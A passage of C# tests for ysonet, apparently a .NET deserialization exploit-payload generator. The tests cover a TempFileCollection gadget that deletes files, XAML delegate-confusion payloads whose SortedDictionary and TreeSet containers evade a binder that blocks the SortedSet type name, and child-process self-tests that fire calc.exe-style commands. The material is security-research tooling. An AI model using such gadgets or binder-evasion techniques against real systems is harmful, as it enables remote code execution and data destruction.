                        formatter + ": a path Path.GetFullPath would rewrite is left alone");
                });
            }
        }

        // -t must be REFUSED, not ignored, and the refusal has to happen before anything can
        // deserialize: a self-test here would build a real TempFileCollection holding the
        // operator's paths inside ysonet.exe and let its finalizer delete them. The proof is
        // a real file that is still there afterwards, plus a forced collection in between.
        // -t in ysonet is a self-exploit, and for this gadget it is genuinely destructive
        // (the maintainer's call): -t deserializes the payload HERE, arming the real
        // TempFileCollection's finalizer, which DELETES the paths in -c on this machine. So
        // -t is ACCEPTED, not refused. Everything here stays inside the test's own artifact
        // directory.
        private static void TempFileCollectionAcceptsSelfTest()
        {
            // Acceptance: -t generation succeeds and the -t refusal is gone. A nonexistent
            // path keeps this half from deleting anything real (the finalizer's Delete is
            // swallowed).
            foreach (string formatter in TempFilesFormatters)
            {
                RunResult r = GenerateTempFiles(formatter, false, true,
                    TestArtifactPath("ysonet_tfc_accept_nonexistent.txt"));
                AssertTrue(r.Success, formatter + " with -t is accepted: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").IndexOf("refuses -t", StringComparison.Ordinal) < 0,
                    formatter + ": no -t refusal remains: " + r.ErrorMessage);
                AssertTrue(!RawIsEmpty(r.Raw), formatter + ": -t still ships a payload");
            }

            // And it really deletes: point -t at a test-owned victim, force the finalizer the
            // -t self-test armed, and the victim is gone. BinaryFormatter reaches the real
            // TempFileCollection sink (the DataContract paths self-test only the inert shape).
            string victim = WriteTestArtifact("ysonet_tfc_selftest_victim.txt", "deleted by -t");
            try
            {
                RunResult r = GenerateTempFiles("BinaryFormatter", false, true, victim);
                AssertTrue(r.Success, "the -t run generates: " + r.ErrorMessage);
                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();
                AssertTrue(!File.Exists(victim),
                    "-t self-tested here, so the TempFileCollection finalizer deleted the victim");
            }
            finally { SafeDelete(victim); }

            // The destructive -t must still refuse a path --minify would rewrite BEFORE it
            // deletes anything: the guard runs on a Test=false probe first. A value the XML
            // minifier collapses, with -t and --minify together, must come back refused and
            // must NOT have deleted the (corrupted) path.
            string protectedVictim = WriteTestArtifact("ysonet_tfc_selftest_minify_victim.txt",
                "must survive a refused minify+-t");
            try
            {
                // A trailing space is rewritten by the XML minifier, so SoapFormatter refuses.
                RunResult r = GenerateTempFiles("SoapFormatter", true, true, protectedVictim + " ");
                AssertTrue(!r.Success, "Soap + --minify + -t on a rewritten path is refused");
                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();
                AssertTrue(File.Exists(protectedVictim),
                    "the refusal happened on the probe, before -t could delete the rewritten path");
            }
            finally { SafeDelete(protectedVictim); }
        }

        // This gadget DELETES the path it carries, so it must never ship a REWRITTEN one. Two
        // separate things rewrite a path in an XML payload: the minifier (deliberately not text
        // preserving) and, with no minification at all, the DataContractSerializer helper's XML
        // writer, which emits a carriage return raw so every parser normalizes it away.
        //
        // The invariant asserted here is the one that matters and does not go stale: whenever
        // generation SUCCEEDS the path must arrive intact, and whenever it fails the message
        // must name the formatter and point at a formatter that does carry it. On top of that,
        // the known refusals and the known-safe cases are locked so the guard is proven live
        // rather than merely present.
        private static void TempFileCollectionRefusesAPathItWouldRewrite()
        {
            // A trailing space and a carriage return are both legal in a Windows path (an NTFS
            // name can end in a space, and a path reached through the device namespace can hold
            // odd characters), so the gadget cannot assume nobody passes one.
            var lossy = new[] { @"C:\ysonet\trailing space ", "C:\\ysonet\\has\rcr.txt" };
            var safe = new[] { @"C:\ysonet\plain.txt", @"C:\ysonet\two  spaces.txt" };

            foreach (string formatter in TempFilesFormatters)
            {
                bool isXml = Array.IndexOf(TempFilesXmlFormatters, formatter) >= 0;
                int refusals = 0;

                foreach (string path in lossy)
                {
                    foreach (bool minify in new[] { false, true })
                    {
                        string label = formatter + (minify ? " --minify" : "") + " " + Preview(path);
                        RunResult r = GenerateTempFiles(formatter, minify, false, path);
                        if (r.Success)
                        {
                            // The invariant: a shipped payload names exactly what was asked for.
                            WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
                            {
                                AssertTrue(TempFilesTableOf(obj).ContainsKey(path),
                                    label + " generated, so it must deliver the path intact");
                            });
                        }
                        else
                        {
                            refusals++;
                            AssertTrue((r.ErrorMessage ?? "").Contains(formatter),
                                "the refusal names the formatter: " + r.ErrorMessage);
                            AssertTrue((r.ErrorMessage ?? "").Contains("BinaryFormatter"),
                                "the refusal offers a formatter that does carry it: " + r.ErrorMessage);
                            AssertTrue((r.ErrorMessage ?? "").Contains("deletes the path it carries"),
                                "the refusal says why it matters: " + r.ErrorMessage);
                        }

                        // Minified XML is the known-lossy combination and must always refuse.
                        if (isXml && minify)
                            AssertTrue(!r.Success, "minified " + formatter + " is refused for "
                                + Preview(path));
                        if (isXml && minify)
                            AssertTrue((r.ErrorMessage ?? "").Contains("cannot use --minify with " + formatter),
                                "the minify refusal names the combination: " + r.ErrorMessage);

                        // A binary formatter has no XML to rewrite, so it must never refuse.
                        if (!isXml)
                            AssertTrue(r.Success, formatter + " carries " + Preview(path)
                                + " (there is no XML to rewrite): " + r.ErrorMessage);
                    }
                }

                if (isXml)
                    AssertTrue(refusals > 0, formatter + " exercised the path-fidelity refusal");
                else
                    AssertEqual(0, refusals, formatter + " never refuses a path");

                // A path the writer and the minifier both leave alone always generates.
                foreach (string path in safe)
                {
                    foreach (bool minify in new[] { false, true })
                    {
                        RunResult r = GenerateTempFiles(formatter, minify, false, path);
                        AssertTrue(r.Success, formatter + (minify ? " --minify" : "")
                            + " is allowed for an ordinary path (" + Preview(path) + "): "
                            + r.ErrorMessage);
                    }
                }
            }

            // The un-minified DataContractSerializer carriage-return case is the writer-level
            // half of this rule, so lock it explicitly: it is the reason the check does not
            // only run under --minify.
            RunResult writerCase = GenerateTempFiles("DataContractSerializer", false, false,
                "C:\\ysonet\\has\rcr.txt");
            AssertTrue(!writerCase.Success,
                "un-minified DataContractSerializer refuses a carriage return its writer loses");
            AssertTrue((writerCase.ErrorMessage ?? "").Contains("XML writer"),
                "the writer-level refusal names the cause: " + writerCase.ErrorMessage);
        }

        // ---- TypeConfuseDelegate XAML-path containers (--rootcontainer) -------------
        //
        // GetXamlGadget is the same delegate confusion with XamlReader.Parse in slot 1, and
        // it now offers the same three roots. Its two consumers, the hosted gadgets below,
        // expose the choice as --rootcontainer. That option is ORTHOGONAL to their --variant,
        // which picks the WRAPPER (TypeConfuseDelegate or TextFormattingRunProperties), so
        // it is a plain option and not a variant.

        private static readonly string[] XamlContainerGadgets =
            { "ActivitySurrogateDisableTypeCheck", "XamlAssemblyLoadFromFile" };

        // The option name comes from the generator, so a rename cannot leave the tests
        // asserting a flag nobody types.
        private static readonly string RootContainerOption =
            TypeConfuseDelegateGenerator.XamlRootContainerOptionName;
        private static readonly string RootContainerFlag = "--" + RootContainerOption;

        // Formatters variant 1 (the TypeConfuseDelegate wrapper) advertises. SoapFormatter is
        // absent on purpose: every container is a generic type (see
        // XamlContainersCannotUseSoapFormatter).
        private static readonly string[] XamlContainerFormatters =
            { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };

        // Pass container=null for the implicit default (no --rootcontainer).
        private static RunResult GenerateXamlContainer(string gadget, string cmd, int variant,
            int? container, string formatter, bool minify)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Test = false;
            ia.Minify = minify;
            var extra = new List<string> { "--variant", variant.ToString() };
            if (container.HasValue) { extra.Add(RootContainerFlag); extra.Add(container.Value.ToString()); }
            ia.ExtraArguments = extra;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = gadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // Adding the container selector must not change the default payload: with no option,
        // each consumer must produce the exact same bytes as an explicit --rootcontainer 1.
        private static void XamlContainerDefaultEqualsContainerOne()
        {
            // ActivitySurrogateDisableTypeCheck ignores -c, so the whole formatter x minify
            // grid is cheap here.
            foreach (string formatter in XamlContainerFormatters)
            {
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;
                    string desc = "ActivitySurrogateDisableTypeCheck -f " + formatter + (minify ? " (minify)" : "");

                    RunResult def = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, null, formatter, minify);
                    RunResult one = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, 1, formatter, minify);
                    AssertTrue(def.Success, "implicit default generates: " + desc + " -> " + def.ErrorMessage);
                    AssertTrue(one.Success, "explicit --rootcontainer 1 generates: " + desc + " -> " + one.ErrorMessage);
                    AssertTrue(BytesEqual(Bytes(def.Raw), Bytes(one.Raw)),
                        "implicit default equals explicit --rootcontainer 1 byte-for-byte: " + desc);

                    // The other two containers must actually produce a DIFFERENT payload,
                    // otherwise the option would be silently ignored.
                    foreach (int container in new[] { 2, 3 })
                    {
                        RunResult other = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, container, formatter, minify);
                        AssertTrue(other.Success, "--rootcontainer " + container + " generates: " + desc + " -> " + other.ErrorMessage);
                        AssertTrue(!BytesEqual(Bytes(def.Raw), Bytes(other.Raw)),
                            "--rootcontainer " + container + " changes the payload: " + desc);
                    }
                }
            }

            // The shared entry point both consumers call: the no-container overload must build
            // exactly the container-1 graph, so no caller of the old signature changes a byte.
            string xaml = "<x>" + new string('a', 64) + "</x>";
            AssertTrue(BytesEqual(BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(xaml)),
                                  BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(xaml, 1))),
                "GetXamlGadget(xaml) equals GetXamlGadget(xaml, 1) byte-for-byte");

            // XamlAssemblyLoadFromFile is deliberately NOT exercised here. It compiles the -c
            // .cs on every generation, and a CodeDom compile is the one step that can wedge on
            // this platform (antivirus + the legacy CSharpCodeProvider), so the normal tier
            // keeps as few compiles as possible. It also cannot be byte-compared across two
            // runs: each compile carries a fresh module id, so two identical requests differ.
            // Its container wiring is asserted on the wire SHAPE in the FULL tier, next to the
            // cells that already compile (XamlContainerFullMatrix).
        }

        // The container option must reject anything that is not 1, 2, or 3 instead of quietly
        // falling back to the default, which would hide a typo behind a payload the user did
        // not ask for. The rejection happens while parsing the options, so it costs nothing
        // even on the consumer that compiles a .cs.
        private static void XamlContainerOptionIsValidated()
        {
            foreach (string gadget in XamlContainerGadgets)
            {
                foreach (string bad in new[] { "nope", "0", "4", "-1", "" })
                {
                    InputArgs ia = new InputArgs();
                    ia.Cmd = "ysonet_no_such_fixture.cs";
                    ia.Test = false;
                    ia.ExtraArguments = new List<string> { RootContainerFlag, bad };
                    RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = gadget,
                        FormatterName = "BinaryFormatter",
                        OutputFormat = "",
                        InputArgs = ia,
                    });
                    AssertTrue(!r.Success, gadget + " " + RootContainerFlag + " " + bad + " is rejected");
                    AssertTrue((r.ErrorMessage ?? "").IndexOf(RootContainerOption + " must be 1, 2, or 3", StringComparison.OrdinalIgnoreCase) >= 0,
                        gadget + " " + RootContainerFlag + " " + bad + " reports the allowed values: " + r.ErrorMessage);
                }
            }

            foreach (int good in new[] { 1, 2, 3 })
                AssertTrue(GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, good, "BinaryFormatter", false).Success,
                    "--rootcontainer " + good + " is accepted");
        }

        // The point of containers 2 and 3 is the wire type names, so assert them directly on
        // the BinaryFormatter stream: the chosen root must be present and the SortedSet name
        // must be gone, while the XamlReader.Parse primitive stays put in all three.
        private static void XamlContainerRootsAvoidSortedSetName()
        {
            const string sortedSet = "System.Collections.Generic.SortedSet`1";
            const string treeSet = "System.Collections.Generic.TreeSet`1";
            const string sortedDict = "System.Collections.Generic.SortedDictionary`2";

            string c1 = XamlContainerStreamText(1);
            AssertTrue(c1.Contains(sortedSet), "container 1 still serializes a SortedSet root");

            string c2 = XamlContainerStreamText(2);
            AssertTrue(c2.Contains(sortedDict), "container 2 serializes a SortedDictionary root");
            AssertTrue(c2.Contains(treeSet), "container 2 carries the inner TreeSet backing set");
            AssertTrue(c2.Contains("KeyValuePairComparer"),
                "container 2 carries the KeyValuePairComparer that forwards key comparisons");
            AssertTrue(!c2.Contains(sortedSet), "container 2 emits no SortedSet type record");

            string c3 = XamlContainerStreamText(3);
            AssertTrue(c3.Contains(treeSet), "container 3 serializes a TreeSet root");
            AssertTrue(!c3.Contains(sortedDict), "container 3 does not wrap the set in a dictionary");
            AssertTrue(!c3.Contains(sortedSet), "container 3 emits no SortedSet type record");

            foreach (var pair in new[] { new[] { "1", c1 }, new[] { "2", c2 }, new[] { "3", c3 } })
            {
                AssertTrue(pair[1].Contains("System.DelegateSerializationHolder"),
                    "container " + pair[0] + " still carries the delegate serialization holder");
                AssertTrue(pair[1].Contains("System.Windows.Markup.XamlReader"),
                    "container " + pair[0] + " still targets XamlReader");
                AssertTrue(pair[1].Contains("Parse"),
                    "container " + pair[0] + " still targets the Parse method");
            }
        }

        // The raw BinaryFormatter bytes of one container, read as ASCII so the embedded type
        // name records can be searched. ActivitySurrogateDisableTypeCheck ignores -c, so this
        // needs no compile.
        private static string XamlContainerStreamText(int container)
        {
            RunResult r = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, container, "BinaryFormatter", false);
            AssertTrue(r.Success, "--rootcontainer " + container + " generates: " + r.ErrorMessage);
            return Encoding.ASCII.GetString(Bytes(r.Raw));
        }

        // The behavioral proof, which the byte-name assertions alone cannot give: through a
        // binder that rejects only the exact SortedSet wire name, container 1 is blocked and
        // never parses its XAML, while containers 2 and 3 deserialize and hand the document to
        // XamlReader.Parse, which runs it.
        //
        // It also proves the ordering the whole XAML path depends on: the spliced method
        // receives the LARGER-sorting element as its first argument, and "" always sorts
        // smaller than a XAML document, so Parse gets the document - in every container.
        //
        // Every deserialization runs in a CHILD process. Parsing this XAML inside a
        // BinaryFormatter callback makes the CLR fail-fast (0xC0000409 in clr.dll) after the
        // payload has already fired - the same reason the *FromFile fire helpers use a
        // subprocess. The marker file is the proof, independent of the child's exit code.
        private static void XamlContainersEvadeSortedSetBinder()
        {
            // Blocked: the binder rejects the SortedSet root, so nothing parses. Asserting an
            // ABSENCE, so it keeps a short bound instead of the full marker budget.
            AssertTrue(!XamlContainerProbeFires(1, true, "c1_blocked", 3000),
                "container 1 does not parse its XAML when its root type is blocked");

            foreach (int container in new[] { 2, 3 })
                AssertTrue(XamlContainerProbeFires(container, true, "c" + container, MarkerWaitMs),
                    "container " + container + " parses its XAML through a binder that rejects the SortedSet wire name");

            // Control: container 1 DOES parse when nothing blocks it, so the absence above is
            // the binder's doing and not a dud payload.
            AssertTrue(XamlContainerProbeFires(1, false, "c1_control", MarkerWaitMs),
                "container 1 parses its XAML when no binder blocks it");
        }

        private const string XamlContainerProbeVar = "YSONET_XAML_CONTAINER_PROBE";

        // Spawn this same test exe in probe mode and report whether the payload fired.
        private static bool XamlContainerProbeFires(int container, bool useBinder, string tag, int waitMs)
        {
            string exe = System.Reflection.Assembly.GetEntryAssembly().Location;
            AssertTrue(!string.IsNullOrEmpty(exe) && File.Exists(exe),
                "the test exe can spawn itself for the XAML container probe");

            // The PARENT owns the fire target and passes the child the command to embed. The
            // child runs its probe branch before any runner setup, so it has no backend of
            // its own to consult; handing it the finished command keeps the two in step.
            using (FireTarget fire = FireBackend.Create("XAMLTCD_binder_" + tag))
            {
                var psi = new System.Diagnostics.ProcessStartInfo(exe);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.WorkingDirectory = Path.GetDirectoryName(exe);
                psi.EnvironmentVariables[XamlContainerProbeVar] =
                    container + "|" + (useBinder ? "1" : "0") + "|" + fire.Command;
                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    proc.OutputDataReceived += delegate { };
                    proc.ErrorDataReceived += delegate { };
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
                    if (!proc.WaitForExit(40000)) { try { proc.Kill(); } catch { } }
                }
                return fire.Wait(waitMs);
            }
        }

        // The child half of the probe: build one XAML-container payload whose XAML drops the
        // marker, deserialize it on an STA thread (with or without the blocking binder), and
        // exit. The process may fail-fast inside the CLR after firing; the parent reads the
        // marker, never the exit code.
        private static int XamlContainerProbe(string spec)
        {
            // Only the first two separators are ours; the rest belongs to the command.
            string[] parts = spec.Split(new[] { '|' }, 3);
            int container = int.Parse(parts[0]);
            bool useBinder = parts[1] == "1";
            string fireCommand = parts[2];

            byte[] payload = BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(MarkerXaml(fireCommand), container));
            RunSTA(delegate
            {
                if (useBinder)
                {
                    DeserializeWithBinder(payload, new SortedSetNameBlockingBinder());
                }
                else
                {
                    var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                    using (var ms = new MemoryStream(payload)) bf.Deserialize(ms);
                }
            });
            // Give the spawned fire process a moment before this process goes away.
            System.Threading.Thread.Sleep(500);
            return 0;
        }

        // A XAML document that produces the fire effect when parsed: the ObjectDataProvider
        // ResourceDictionary payload, the same shape both consumers carry.
        private static string MarkerXaml(string fireCommand)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = fireCommand;
            ia.IsRawCmd = true;
            ia.Test = false;
            var gen = new ObjectDataProviderGenerator();
            gen.Options().Parse(new[] { "--variant", "2" });
            return (string)gen.Generate("xaml", ia);
        }

        // The container belongs to the TypeConfuseDelegate wrapper only. With the
        // TextFormattingRunProperties wrapper (variant 2) there is no sorted container at all,
        // so the option is accepted and simply ignored - it must never change those bytes.
        private static void XamlContainerIsIgnoredByTheTfrpWrapper()
        {
            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter" })
            {
                RunResult plain = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 2, null, formatter, false);
                AssertTrue(plain.Success, "the TFRP wrapper generates on " + formatter + ": " + plain.ErrorMessage);

                foreach (int container in new[] { 1, 2, 3 })
                {
                    RunResult withContainer = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 2, container, formatter, false);
                    AssertTrue(withContainer.Success,
                        "the TFRP wrapper accepts --rootcontainer " + container + " on " + formatter + ": " + withContainer.ErrorMessage);
                    AssertTrue(BytesEqual(Bytes(plain.Raw), Bytes(withContainer.Raw)),
                        "--rootcontainer " + container + " does not change the TFRP wrapper payload on " + formatter);
                }
            }
        }

        // Formatter-expansion result, locked as a test instead of left as an assumption. The
        // container swap does not widen the formatter set of these consumers: all three roots
        // are GENERIC types (SortedSet`1, SortedDictionary`2, TreeSet`1) and SoapFormatter
        // cannot serialize a generic type, so variant 1 stays opted out for every container.
        // Asserted rather than silently omitted, so a framework or serializer change that
        // lifts the limitation says so here.
        private static void XamlContainersCannotUseSoapFormatter()
        {
            foreach (string gadget in XamlContainerGadgets)
            {
                foreach (int container in new[] { 1, 2, 3 })
                {
                    // The variant+formatter guard runs before any .cs compile, so this stays
                    // cheap for XamlAssemblyLoadFromFile too.
                    RunResult r = GenerateXamlContainer(gadget, "ysonet_no_such_fixture.cs", 1, container, "SoapFormatter", false);
                    AssertTrue(!r.Success,
                        gadget + " variant 1 + --rootcontainer " + container + " cannot use SoapFormatter");
                    AssertTrue((r.ErrorMessage ?? "").IndexOf("is not supported by variant 1", StringComparison.OrdinalIgnoreCase) >= 0,
                        gadget + " --rootcontainer " + container + " reports the variant opt-out: " + r.ErrorMessage);
                }
            }
        }

        // The root container is a plain gadget option, exactly like
        // TextFormattingRunProperties' --xamlurl: it must NOT appear as a variant, must start
        // unset (so the default payload is unchanged), and must reach the echoed command line
        // as --rootcontainer N.
        private static void EditorExposesTheXamlContainerOption()
        {
            foreach (string gadget in XamlContainerGadgets)
            {
                AssertEqual(2, Gadget(gadget).Variants().Count,
                    gadget + " still declares two WRAPPER variants (the container is not one)");

                var ed = new ModuleEditor(null, null, true, null, null);
                var fields = ed.BuildFieldsForTest(gadget);

                EditableField container = FindEditable(fields, RootContainerOption);
                AssertTrue(container != null, "the " + RootContainerOption + " setting is offered for " + gadget);
                AssertTrue(container.ModuleOwn, "the " + RootContainerOption + " setting belongs to " + gadget);

                EditableField variant = FindEditable(fields, "variant");
                AssertTrue(variant != null && !ReferenceEquals(variant, container),
                    "the container is a separate setting from the wrapper variant (" + gadget + ")");
                AssertTrue(string.IsNullOrEmpty(container.Value),
                    "the container starts unset, so the default payload stays the shipped one (" + gadget + ")");

                EditableField command = FindEditable(fields, "command");
                if (command != null) command.Value = "calc.exe";

                container.Value = "3";
                string line = ed.GadgetCommandLineForTest();
                AssertTrue(line.Contains(RootContainerFlag + " 3"),
                    "the echoed command line carries the container: " + line);
            }
        }

        // A variant can declare which of the gadget's own options it does not use
        // (GadgetVariant.WithoutOptions), the gadget-side counterpart of a plugin mode's
        // option list. The data model must default to "every option applies", so the
        // gadgets that declare nothing - almost all of them - are untouched.
        private static void VariantOptionScopeDataModel()
        {
            var plain = new GadgetVariant(1, "plain");
            AssertTrue(plain.UnusedOptions.Count == 0, "a variant declares no unused option by default");
            AssertTrue(plain.UsesOption("anything"), "a variant with no declaration uses every option");
            AssertTrue(plain.UsesOption(null), "a null option name is not treated as excluded");

            var scoped = new GadgetVariant(2, "scoped").WithoutOptions("rootcontainer", "");
            AssertEqual(1, scoped.UnusedOptions.Count, "an empty name is ignored, a real one is kept");
            AssertTrue(!scoped.UsesOption("rootcontainer"), "the declared option is excluded");
            AssertTrue(!scoped.UsesOption("RootContainer"), "the match is case-insensitive");
            AssertTrue(scoped.UsesOption("variant"), "an undeclared option still applies");

            // The wiring: the TFRP wrapper of both consumers is the only declaration today.
            foreach (string gadget in XamlContainerGadgets)
            {
                var variants = Gadget(gadget).Variants();
                AssertTrue(variants[0].UsesOption(RootContainerOption),
                    gadget + " variant 1 (TypeConfuseDelegate wrapper) uses the root container");
                AssertTrue(!variants[1].UsesOption(RootContainerOption),
                    gadget + " variant 2 (TextFormattingRunProperties wrapper) declares it unused");
            }
        }

        // The editor must act on that declaration: with the TFRP wrapper selected the
        // setting disappears, and a value left over from the other wrapper must NOT reach
        // the command line. Switching back brings it and its value back.
        private static void EditorHidesAnOptionTheVariantDoesNotUse()
        {
            foreach (string gadget in XamlContainerGadgets)
            {
                var ed = new ModuleEditor(null, null, true, null, null);
                var fields = ed.BuildFieldsForTest(gadget);
                EditableField command = FindEditable(fields, "command");
                if (command != null) command.Value = "calc.exe";

                EditableField variant = FindEditable(fields, "variant");
                EditableField container = FindEditable(fields, RootContainerOption);
                var declared = Gadget(gadget).Variants();

                // Variant 1: visible, and it reaches the command line.
                variant.Value = declared[0].Label;
                container.Value = "2";
                string withWrapper = ed.GadgetCommandLineForTest();
                AssertTrue(!container.Hidden, gadget + " shows the container for the TCD wrapper");
                AssertTrue(withWrapper.Contains(RootContainerFlag + " 2"),
                    gadget + " emits the container for the TCD wrapper: " + withWrapper);

                // Variant 2: hidden, and the carried-over value is dropped.
                variant.Value = declared[1].Label;
                string tfrpLine = ed.GadgetCommandLineForTest();
                AssertTrue(container.Hidden, gadget + " hides the container for the TFRP wrapper");
                AssertTrue(!tfrpLine.Contains(RootContainerFlag),
                    gadget + " does not emit the container for the TFRP wrapper: " + tfrpLine);

                // Back again: the setting and its value return, so hiding never destroys input.
                variant.Value = declared[0].Label;
                string backLine = ed.GadgetCommandLineForTest();
                AssertTrue(!container.Hidden, gadget + " shows the container again for the TCD wrapper");
                AssertTrue(backLine.Contains(RootContainerFlag + " 2"),
                    gadget + " keeps the container value across a variant round trip: " + backLine);
            }

            // A gadget whose variants declare nothing keeps every option visible, for every
            // variant. TextFormattingRunProperties has no variants but two plain options, and
            // --xamlurl is the one that used to live on ObjectDataProvider.
            var tfrpEd = new ModuleEditor(null, null, true, null, null);
            var tfrpFields = tfrpEd.BuildFieldsForTest("TextFormattingRunProperties");
            EditableField tfrpXamlUrl = FindEditable(tfrpFields, "xamlurl");
            AssertTrue(tfrpXamlUrl != null && !tfrpXamlUrl.Hidden,
                "TextFormattingRunProperties still offers xamlurl");

            // ObjectDataProvider keeps its variants and its one plain option, and every
            // variant leaves that option visible.
            var odpEd = new ModuleEditor(null, null, true, null, null);
            var odpFields = odpEd.BuildFieldsForTest("ObjectDataProvider");
            EditableField odpVariant = FindEditable(odpFields, "variant");
            AssertTrue(odpVariant != null, "ObjectDataProvider offers variant");
            AssertTrue(FindEditable(odpFields, "xamlurl") == null,
                "ObjectDataProvider no longer offers xamlurl; it moved to ResourceDictionary as -c");
            foreach (GadgetVariant v in Gadget("ObjectDataProvider").Variants())
            {
                odpVariant.Value = v.Label;
                odpEd.RefreshDynamicForTest();
                AssertTrue(!odpVariant.Hidden,
                    "ObjectDataProvider variant " + v.Number + " declares no unused option");
            }
        }

        // The XAML wrapper payload fires INSIDE a deserialization callback and then
        // fail-fasts the CLR, so -t used to kill ysonet.exe with no message right after
        // printing the payload. The gadget now declares SelfTestNeedsChildProcess, which
        // routes the self-test through a child ysonet process. The proof is that this
        // process is still alive to assert afterwards: before the fix, generating with
        // Test=true here took the whole test runner down.
        private static void XamlWrapperSelfTestSurvivesTheHostProcess()
        {
            var gen = GadgetRegistry.CreateGadgetInstance("ActivitySurrogateDisableTypeCheck") as GenericGenerator;
            AssertTrue(gen != null, "the gadget loads");

            InputArgs probe = new InputArgs();
            probe.Cmd = "calc.exe";
            probe.Test = true;
            AssertTrue(gen.SelfTestNeedsChildProcess("BinaryFormatter", probe),
                "variant 1 declares that its self-test needs a child process");

            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";     // ignored by this gadget
            ia.Test = true;          // the whole point: run the self-test
            RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "ActivitySurrogateDisableTypeCheck",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = ia,
            });

            AssertTrue(r.Success, "the payload is still produced with -t: " + r.ErrorMessage);
            AssertTrue(!RawIsEmpty(r.Raw), "the payload is non-empty with -t");

            // The TFRP wrapper does not need isolation, and asking for it must not have
            // leaked onto every gadget.
            var tfrp = GadgetRegistry.CreateGadgetInstance("ActivitySurrogateDisableTypeCheck") as GenericGenerator;
            tfrp.Options().Parse(new[] { "--variant", "2" });
            AssertTrue(!tfrp.SelfTestNeedsChildProcess("BinaryFormatter", probe),
                "the TextFormattingRunProperties wrapper self-tests in-process as before");
            AssertTrue(!((GenericGenerator)GadgetRegistry.CreateGadgetInstance("TypeConfuseDelegate")).SelfTestNeedsChildProcess("BinaryFormatter", probe),
                "an ordinary gadget still self-tests in-process");
        }

        // The isolated self-test deserializes in a child process with a PLAIN formatter, so
        // a gadget that installs its own SerializationBinder (PSObject's LocalBinder resolves
        // the bundled vulnerable assembly, which a plain deserialize would miss) would be
        // tested against different types than it ships. GenericGenerator refuses that pair
        // outright rather than reporting a self-test that proved something else. No real
        // gadget combines them, so the guard is proven with a fake that deliberately does.
        private static void IsolatedSelfTestRefusesACustomBinder()
        {
            var fake = new ysonet.Tests.Helpers.TestingArena.IsolatedSelfTestWithBinderFakeGenerator();

            InputArgs noTest = new InputArgs();
            noTest.Test = false;
            object payload = fake.Generate("BinaryFormatter", noTest);
            AssertTrue(!RawIsEmpty(payload), "without -t the pair is irrelevant and the payload is produced");

            InputArgs withTest = new InputArgs();
            withTest.Test = true;
            Exception caught = null;
            try { new ysonet.Tests.Helpers.TestingArena.IsolatedSelfTestWithBinderFakeGenerator().Generate("BinaryFormatter", withTest); }
            catch (Exception ex) { caught = ex; }

            AssertTrue(caught != null, "-t on a binder + isolated self-test pair is refused");
            AssertTrue(caught.Message.IndexOf("SerializationBinder", StringComparison.OrdinalIgnoreCase) >= 0,
                "the refusal names the reason: " + caught.Message);

            // And the real gadgets that DO use isolation install no binder, so none of them
            // can hit that refusal.
            InputArgs probe = new InputArgs();
            probe.Cmd = "calc.exe";
            probe.Test = false;
            foreach (string gadget in XamlContainerGadgets)
            {
                var g = GadgetRegistry.CreateGadgetInstance(gadget) as GenericGenerator;
                AssertTrue(g.SelfTestNeedsChildProcess("BinaryFormatter", probe),
                    gadget + " uses the isolated self-test");
                AssertTrue(g.serializationBinder == null,
                    gadget + " installs no SerializationBinder, so the isolated self-test is valid for it");
            }
        }

        // The isolated self-test used to know only the four object-graph formatters, so a gadget
        // on a hand written format could not be self-tested out of process at all. It now goes
        // through the shared reader, and it forces a collection afterwards, because some effects
        // only happen when the object is COLLECTED rather than when it is read.
        //
        // Proven with a document of this test's own - naming a harmless mscorlib type - rather
        // than with a real payload: this exercises the child MECHANISM, and the one gadget that
        // depends on it is a denial-of-service gadget no test may deserialize in any process.
        private static void IsolatedSelfTestChildReadsAHandWrittenFormat()
        {
            string exe = Path.Combine(FindWorkspaceRoot(), "ysonet", "bin", "Debug", "ysonet.exe");
            if (!File.Exists(exe))
            {
                Console.Error.WriteLine("  [skip] ysonet.exe was not found beside the test runner, "
                    + "so the isolated self-test child was not driven end to end "
                    + "(capability: ysonet-exe-on-disk)");
                return;
            }

            // A hand written Json.NET document, which is exactly the family the child could not
            // read before. StringBuilder is inert: building one has no effect of any kind.
            string payloadFile = WriteTestArtifact("ysonet_isolated_selftest_probe.json",
                @"{ ""$type"": ""System.Text.StringBuilder, mscorlib, Version=4.0.0.0, "
                + @"Culture=neutral, PublicKeyToken=b77a5c561934e089"" }");
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo(exe);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.EnvironmentVariables[IsolatedSelfTest.PayloadFileVar] = payloadFile;
